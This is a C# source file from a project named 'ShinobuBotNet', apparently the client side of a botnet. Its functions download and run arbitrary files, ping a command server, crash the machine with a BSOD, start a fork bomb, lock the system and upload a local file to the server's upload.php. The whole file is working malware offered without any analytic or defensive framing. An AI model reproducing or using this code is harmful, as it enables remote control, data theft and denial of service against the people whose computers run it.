﻿using System.Diagnostics;
using System.Net;
using System.Threading;
using System.Windows;

namespace ShinobuBotNet
{
    class functions
    {
        public static void OpenLink(string URI)
        {
            if (URI.StartsWith("http"))
            {
                Thread thr = new Thread(() => { Process.Start(URI); });
                thr.Start();
            }
        }

        public static void DownloadExecute(string URI)
        {
            Thread thr = new Thread(() =>
            {
                string file_path = web.DownloadFile(URI);
                Process.Start(file_path);
            });
            thr.Start();
        }

        public static void ping()
        {
            WebClient wc = new WebClient();
            wc.Proxy = null;
            string PingURI = configs.server + "ping.php";
            Thread thr = new Thread(() =>
           {
               wc.DownloadString(PingURI);
           });
            thr.Start();

        }

        public static void BSOD()
        {
            ProcessStartInfo psi;
            psi = new ProcessStartInfo("cmd", @"inferno.exe EVIL_BSOD");
            Process.Start(psi);
        }

        public static void forkbomb()
        {
            ProcessStartInfo psi;
            psi = new ProcessStartInfo("cmd", @"inferno.exe EVIL_FORKBOMB");
            Process.Start(psi);
        }
        
        public static void BlockSystem(string second)
        {
            Thread thr = new Thread(() =>
            {
                ProcessStartInfo psi;
                psi = new ProcessStartInfo("cmd", @"inferno.exe BLOCK_SYSTEM " + second + "");
                Process.Start(psi);
            });
            thr.Start();
        }

        public static void wallpaper(string URI)
        {
            Thread thr = new Thread(() =>
            {
                string file_path = web.DownloadFile(URI);
                ProcessStartInfo psi;
                psi = new ProcessStartInfo("cmd", @"inferno.exe WALLPAPER " + file_path + "");
                Process.Start(psi);
            });
            thr.Start();
        }

        public static void screenshot()
        {
            Thread thr = new Thread(() =>
            {
                //делаем скрин
                ProcessStartInfo psi;
                string file_name = "screnshot.jpg";
                psi = new ProcessStartInfo("cmd", @"inferno.exe DESKTOP_SCREENSHOT " + file_name + "");
                Process.Start(psi);
                //отправка файла
                System.Net.WebClient Client = new System.Net.WebClient();
                Client.Headers.Add("png/jpg", "binary/octet-stream");
                byte[] result = Client.UploadFile(configs.server + "upload.php", "POST", @"C:\autobuy.txt");
            });

        }


        public static void MSG(string text)
        {
            MessageBox.Show(text);
        }


    }
}